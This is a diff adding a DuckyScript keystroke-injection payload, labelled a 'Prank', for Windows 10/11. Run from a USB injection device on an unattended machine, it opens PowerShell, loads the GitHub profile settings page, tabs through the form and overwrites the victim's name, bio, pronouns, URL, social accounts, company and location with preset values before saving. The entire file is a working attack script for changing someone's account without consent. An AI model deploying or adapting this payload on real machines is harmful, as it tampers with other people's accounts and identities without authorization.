@@ -1,0 +1,62 @@
+REM ###################################################
+REM #                                                 |
+REM # Title        : Change Github Profile Settings   |
+REM # Author       : Aleff                            |
+REM # Version      : 1.0                              |
+REM # Category     : Prank                            |
+REM # Target       : Windows 10/11                    |
+REM #                                                 |
+REM ###################################################
+
+
+REM Requirements:
+REM     - Internet connection
+REM     - Logged in Github
+
+REM You must set the new Profile Settings
+DEFINE #NAME example
+DEFINE #BIO example
+DEFINE #CUSTOM-PRONOUNS example
+DEFINE #URL example
+DEFINE #SOCIAL-ACCOUNT-1 example
+DEFINE #SOCIAL-ACCOUNT-2 example
+DEFINE #SOCIAL-ACCOUNT-3 example
+DEFINE #SOCIAL-ACCOUNT-4 example
+DEFINE #COMPANY example
+DEFINE #LOCATION example
+
+DELAY 1000
+GUI r
+DELAY 500
+STRINGLN powershell
+DELAY 500
+
+STRINGLN Start-Process "https://github.com/settings/profile"; exit;
+REM It depends by the computer power and by the internet connection power
+DELAY 2000
+
+REPEAT 37 TAB
+STRING #NAME
+REPEAT 4 TAB
+STRING #BIO
+TAB
+REPEAT 4 DOWNARROW
+STRING #CUSTOM-PRONOUNS
+TAB
+STRING #URL
+TAB
+STRING #SOCIAL-ACCOUNT-1
+TAB
+STRING #SOCIAL-ACCOUNT-2
+TAB
+STRING #SOCIAL-ACCOUNT-3
+TAB
+STRING #SOCIAL-ACCOUNT-4
+TAB
+STRING #COMPANY
+TAB
+STRING #LOCATION
+REPEAT 4 TAB
+ENTER
+DELAY 2000
+ALT-F4
